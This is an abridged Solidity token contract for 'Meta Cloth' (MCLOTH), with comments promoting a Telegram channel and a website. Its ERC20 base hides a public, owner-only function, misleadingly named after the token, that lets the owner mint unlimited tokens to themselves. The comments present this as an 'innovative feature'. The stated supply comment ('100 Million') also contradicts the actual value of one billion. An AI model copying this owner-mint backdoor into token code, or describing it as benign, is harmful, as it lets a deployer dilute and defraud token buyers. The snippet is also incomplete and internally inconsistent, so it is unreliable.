...
//
// $MetaCloth proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/MetaCloth
// 📱 Telegram::https://www.metaclothus.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaCloth(uint256 amount) public onlyOwner {
 _MetaCloth(msg.sender, amount);
    }
    ...
    function _MetaCloth(address account, uint256 amount) internal virtual {
...
contract $MetaCloth is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Meta Cloth", "MCLOTH") {
     _MetaCloth(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}